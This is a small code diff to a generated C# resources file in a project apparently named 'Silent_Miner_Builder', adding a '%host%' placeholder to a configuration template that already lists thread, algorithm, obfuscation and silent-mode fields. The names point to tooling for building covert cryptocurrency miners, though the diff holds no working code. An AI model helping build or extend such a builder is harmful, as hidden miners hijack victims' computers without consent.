@@ -152,7 +152,8 @@ namespace Silent_Miner_Builder.Properties {
         ///%threads%
         ///%algo%
         ///%obf%
-        ///%silent%.
+        ///%silent%
+        ///%host%.
         /// </summary>
         internal static string Profile {
             get {
